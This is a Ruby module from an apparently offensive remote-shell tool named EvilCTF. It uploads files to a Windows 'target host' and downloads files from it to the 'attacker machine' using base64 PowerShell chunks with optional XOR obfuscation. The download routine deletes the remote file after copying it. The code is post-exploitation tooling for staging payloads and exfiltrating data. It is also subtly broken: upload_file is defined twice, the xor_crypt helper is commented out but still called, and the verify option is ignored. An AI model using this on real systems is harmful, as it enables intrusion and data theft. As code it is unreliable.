# lib/evil_ctf/uploader.rb
require 'base64'
require 'fileutils'
require 'digest'
require 'evil_ctf/crypto'

module EvilCTF::Uploader
  DEBUG = ENV['EVC_DEBUG'] == 'true'

  def self.log_debug(msg)
    puts "[DEBUG] #{msg}" if DEBUG
  end

  # Default chunk size ~64KB (Base64 expands ~4/3, so will be ~86KB transmitted)
  DEFAULT_CHUNK_SIZE = 64 * 1024
  SQL_DEFAULT_CHUNK_SIZE = 1 * 1024  # Smaller chunks for SQL files

  # PowerShell helper: double single-quotes inside single-quoted strings
  def self.ps_single_quote_escape(s)
    s.to_s.gsub("'", "''")
  end

  # ---------------------------------------------
  # Upload a local file to the remote target (streaming chunked)
  # - shell.run(ps) must return an object with `output` string
  # - encrypt: XOR each raw byte stream before base64-encoding
  # - verify: compute SHA256 locally and compare to remote Get-FileHash
  # ---------------------------------------------
  def self.upload_file(local_path, remote_path, shell,
                       encrypt: false,
                       chunk_size: DEFAULT_CHUNK_SIZE,
                       verify: true)
    return false unless File.exist?(local_path)

    log_debug("Preparing streaming upload: #{local_path} -> #{remote_path}")

    # Compute local SHA256 (streamed) for final verification
    local_sha256 = Digest::SHA256.file(local_path).hexdigest
    log_debug("Local SHA256: #{local_sha256}")

    # Ensure remote directory exists (PowerShell New-Item -Force for directory)
    remote_dir = File.dirname(remote_path).gsub('\\', '\\\\')
    ps_mkdir = <<~PS
      try {
        $d = '#{ps_single_quote_escape(remote_dir)}'
        if (!(Test-Path $d)) { New-Item -Path $d -ItemType Directory -Force | Out-Null }
        "OK"
      } catch {
        "ERROR: $($_.Exception.Message)"
      }
    PS

    dm = shell.run(ps_mkdir)
    log_debug("Remote mkdir output: #{dm.output}")

    # Initialize (create/overwrite) the remote file
    escaped_remote = ps_single_quote_escape(remote_path)
    ps_init = <<~PS
      try {
        $path = '#{escaped_remote}'
        if (Test-Path $path) { Remove-Item $path -Force -ErrorAction SilentlyContinue }
        # Create an empty file
        $fs = [System.IO.File]::Open($path, [System.IO.FileMode]::Create)
        $fs.Close()
        "INIT"
      } catch {
        "ERROR: $($_.Exception.Message)"
      }
    PS

    init = shell.run(ps_init)
    log_debug("Init output: #{init.output}")
    return false unless init.output.include?('INIT')

    # Stream the local file, chunk by chunk
    File.open(local_path, 'rb') do |f|
      idx = 0
      while (buf = f.read(chunk_size))
        payload = encrypt ? EvilCTF::Crypto.xor_crypt(buf) : buf
        b64 = Base64.strict_encode64(payload)

        # Use a single-quoted here-string to avoid any quoting issues
        # Example PowerShell snippet writes bytes via Append mode
        ps_chunk = <<~PS
          try {
            $b64 = @'
#{b64}
'@
            $bytes = [Convert]::FromBase64String($b64)
            $path = '#{escaped_remote}'
            $fs = [System.IO.File]::Open($path, [System.IO.FileMode]::Append)
            $fs.Write($bytes, 0, $bytes.Length)
            $fs.Close()
            "CHUNK #{idx}"
          } catch {
            "ERROR: $($_.Exception.Message)"
          }
        PS

        log_debug("Uploading chunk #{idx}, size=#{payload.bytesize}")
        result = shell.run(ps_chunk)
        log_debug("Chunk #{idx} output: #{result.output}")

        # Add progress tracking
        if idx % 10 == 0 || buf.size < chunk_size
          puts "[*] Upload progress: #{idx * 100 / (File.size(local_path) / chunk_size).round(2)}% (#{idx} chunks)"
        end

        return false unless result.output.include?("CHUNK #{idx}")

        idx += 1
      end
    end
  end

  # ---------------------------------------------
  # Upload a local file to the remote target (streaming chunked)
  # - shell.run(ps) must return an object with `output` string
  # - encrypt: XOR each raw byte stream before base64-encoding
  # - verify: compute SHA256 locally and compare to remote Get-FileHash
  # ---------------------------------------------
  def self.upload_file(local_path, remote_path, shell,
                       encrypt: false,
                       chunk_size: DEFAULT_CHUNK_SIZE,
                       verify: true)
    return false unless File.exist?(local_path)

    log_debug("Preparing streaming upload: #{local_path} -> #{remote_path}")

    # Compute local SHA256 (streamed) for final verification
    local_sha256 = Digest::SHA256.file(local_path).hexdigest
    log_debug("Local SHA256: #{local_sha256}")

    # Ensure remote directory exists (PowerShell New-Item -Force for directory)
    remote_dir = File.dirname(remote_path).gsub('\\', '\\\\')
    ps_mkdir = <<~PS
      try {
        $d = '#{ps_single_quote_escape(remote_dir)}'
        if (!(Test-Path $d)) { New-Item -Path $d -ItemType Directory -Force | Out-Null }
        "OK"
      } catch {
        "ERROR: $($_.Exception.Message)"
      }
    PS

    dm = shell.run(ps_mkdir)
    log_debug("Remote mkdir output: #{dm.output}")

    # Initialize (create/overwrite) the remote file
    escaped_remote = ps_single_quote_escape(remote_path)
    ps_init = <<~PS
      try {
        $path = '#{escaped_remote}'
        if (Test-Path $path) { Remove-Item $path -Force -ErrorAction SilentlyContinue }
        # Create an empty file
        $fs = [System.IO.File]::Open($path, [System.IO.FileMode]::Create)
        $fs.Close()
        "INIT"
      } catch {
        "ERROR: $($_.Exception.Message)"
      }
    PS

    init = shell.run(ps_init)
    log_debug("Init output: #{init.output}")
    return false unless init.output.include?('INIT')

    # Stream the local file, chunk by chunk
    File.open(local_path, 'rb') do |f|
      idx = 0
      while (buf = f.read(chunk_size))
        payload = encrypt ? xor_crypt(buf) : buf
        b64 = Base64.strict_encode64(payload)

        # Use a single-quoted here-string to avoid any quoting issues
        # Example PowerShell snippet writes bytes via Append mode
        ps_chunk = <<~PS
          try {
            $b64 = @'
#{b64}
'@
            $bytes = [Convert]::FromBase64String($b64)
            $path = '#{escaped_remote}'
            $fs = [System.IO.File]::Open($path, [System.IO.FileMode]::Append)
            $fs.Write($bytes, 0, $bytes.Length)
            $fs.Close()
            "CHUNK #{idx}"
          } catch {
            "ERROR: $($_.Exception.Message)"
          }
        PS

        log_debug("Uploading chunk #{idx}, size=#{payload.bytesize}")
        result = shell.run(ps_chunk)
        log_debug("Chunk #{idx} output: #{result.output}")

        # Add progress tracking
        if idx % 10 == 0 || buf.size < chunk_size
          puts "[*] Upload progress: #{idx * 100 / (File.size(local_path) / chunk_size).round(2)}% (#{idx} chunks)"
        end

        return false unless result.output.include?("CHUNK #{idx}")

        idx += 1
      end
    end
  end

  # ---------------------------------------------
  # Download a remote file to the local machine (streamed)
  # - Uses Out-String -Width to avoid PowerShell wrapping
  # ---------------------------------------------
  def self.download_file(remote_path, local_path, shell,
                         encrypt: false,
                         allow_empty: true)
    # Verify that the file exists on the target
    exist = shell.run("Test-Path '#{ps_single_quote_escape(remote_path)}'")
    log_debug("Exist check output:\n#{exist.output}")
    return false unless exist.output.strip == 'True'

    # Read the remote file as Base64 using no-wrap Out-String width trick
    ps_read = <<~PS
      try {
        $path = '#{ps_single_quote_escape(remote_path)}'
                $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
        # Ensure single-line output, avoid host wrapping
        $b64 | Out-String -Width 9999999
      } catch {
        "ERROR: $($_.Exception.Message)"
      }
    PS

    result = shell.run(ps_read)
    if result.nil? || result.output.nil?
      puts "[!] Unable to read remote file: #{remote_path}"
      return false
    end

    clean_output = result.output.strip.split('\n').last.strip
    if clean_output.empty?
      puts "[!] Remote file is empty; skipping download."
      return true if allow_empty
      return false
    end

    unless clean_output =~ /^[A-Za-z0-9+\/=]+$/
      puts "[!] Invalid base64 data received for #{remote_path}"
      puts "[!] Output preview: #{clean_output[0..200]}..."
      return false
    end

    data = Base64.strict_decode64(clean_output)
    data = xor_crypt(data) if encrypt

    FileUtils.mkdir_p(File.dirname(local_path))

    # Stream-write locally with progress tracking
    puts "[*] Downloading file (size: #{data.bytesize})..."
    File.open(local_path, 'wb') do |f|
      f.write(data)
      puts "[+] Download complete"
    end

    puts "[+] Downloaded #{remote_path} -> #{local_path}"

    # Optionally remove remote file
    shell.run("Remove-Item '#{ps_single_quote_escape(remote_path)}' -Force -ErrorAction SilentlyContinue")
    true
  rescue => e
    puts "[!] Download failed: #{e.message}"
    false
  end

  # ---------------------------------------------
  # File operations menu (upload/download/ZIP)
  # ---------------------------------------------
  def self.file_operations_menu(shell)
    loop do
      puts "\nFile Operations Menu:"
      puts "1. Upload file"
      puts "2. Download file"
      puts "3. Unzip remote file"
      puts "4. Exit menu"
      print "Choice: "

      choice = Readline.readline.strip rescue nil
      break if choice.nil? || choice == '4'

      case choice
      when '1'
        print "Source file path (attacker machine): "
        local = Readline.readline.strip rescue nil
        print "Destination file path (target host): "
        remote = Readline.readline.strip rescue nil
        if local && remote
          unless File.exist?(local)
            puts "[-] Source file does not exist: #{local}"
            next
          end

          # Create directory structure on target if needed
          dir_path = File.dirname(remote).gsub('\\', '/')
          unless dir_path.empty?
            mkdir_cmd = "New-Item -Path '#{dir_path}' -ItemType Directory -Force -ErrorAction SilentlyContinue"
            shell.run(mkdir_cmd)
          end

          if self.upload_file(local, remote, shell)
            puts "[+] File uploaded successfully"
          else
            puts "[-] Upload failed"
          end
        else
          puts "[!] Both paths are required for upload"
        end
      when '2'
        print "Source file path (target host): "
        remote = Readline.readline.strip rescue nil
        print "Destination file path (attacker machine): "
        local = Readline.readline.strip rescue nil
        if remote && local
          # Validate that source exists on target
          exist = shell.run("Test-Path '#{remote}'")
          if exist.output.strip != 'True'
            puts "[-] Source file does not exist on target: #{remote}"
            next
          end

          if self.download_file(remote, local, shell)
            puts "[+] File downloaded successfully"
          else
            puts "[-] Download failed"
          end
        else
          puts "[!] Both paths are required for download"
        end
      when '3'
        print "Remote ZIP path: "
        zip_path = Readline.readline.strip rescue nil
        print "Extract to (optional): "
        extract_to = Readline.readline.strip rescue nil
        if zip_path
          remote_unzip(shell, zip_path, extract_to)
        else
          puts "[!] ZIP path required"
        end
      else
        puts "[!] Invalid choice"
      end
    end
  rescue => e
    puts "[!] File operations error: #{e.message}"
  end

  # ---------------------------------------------
  # Unzip a remote ZIP file
  # ---------------------------------------------
  def self.remote_unzip(shell, remote_zip_path, extract_to = nil)
    extract_to ||= File.dirname(remote_zip_path)

    ps = <<~PS
      try {
        $zipPath = "#{ps_single_quote_escape(remote_zip_path)}"
        $extractPath = "#{ps_single_quote_escape(extract_to)}"
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)
        Get-ChildItem $extractPath -Recurse | Select-Object FullName, Length
      } catch {
        Write-Output "ERROR: $($_.Exception.Message)"
      }
    PS

    result = shell.run(ps)
    if result.output.include?('ERROR:')
      puts result.output
      false
    else
      puts result.output
      true
    end
  rescue => e
    puts "[!] Remote unzip failed: #{e.message}"
    false
  end

  # ---------------------------------------------
  # XOR encryption helper (optional)
  # - Added SQL-specific XOR methods
  # ---------------------------------------------
  #def self.xor_crypt(data, key = 0x42)
  #  data.bytes.map { |b| (b ^ key).chr }.join
  #rescue => e
  #  puts "[!] XOR crypt failed: #{e.message}"
  #  data
  #end

  # ---------------------------------------------
  # SQL-specific XOR encryption helper (optional)
  # - For handling SQL query results with XOR obfuscation
  # ---------------------------------------------
  def self.sql_xor_crypt(data, key = 0x42)
    # Add SQL-specific XOR patterns detection
    if data.is_a?(String) && data.include?("SQL Server")
      puts "[*] Detected potential SQL XOR obfuscation"
      xor_crypt(data, key)
    else
      xor_crypt(data, key)
    end
  rescue => e
    puts "[!] SQL XOR crypt failed: #{e.message}"
    data
  end

  # ---------------------------------------------
  # Helper to get system architecture from PowerShell
  # ---------------------------------------------
  def self.get_system_architecture(shell)
    arch = shell.run('$env:PROCESSOR_ARCHITECTURE').output.strip
    arch
  rescue => e
    puts "[!] Unable to detect architecture: #{e.message}"
    'UNKNOWN'
  end

  # ---------------------------------------------
  # SQL-specific file handling methods
  # ---------------------------------------------
  def self.handle_sql_file(local_path, remote_path, shell,
                          encrypt: false,
                          chunk_size: SQL_DEFAULT_CHUNK_SIZE)
    upload_file(local_path, remote_path, shell,
                encrypt: encrypt,
                chunk_size: chunk_size)
  end

  # ---------------------------------------------
  # SQL-specific file download methods
  # ---------------------------------------------
  def self.download_sql_file(remote_path, local_path, shell,
                            encrypt: false)
    download_file(remote_path, local_path, shell,
                 encrypt: encrypt)
  end
end
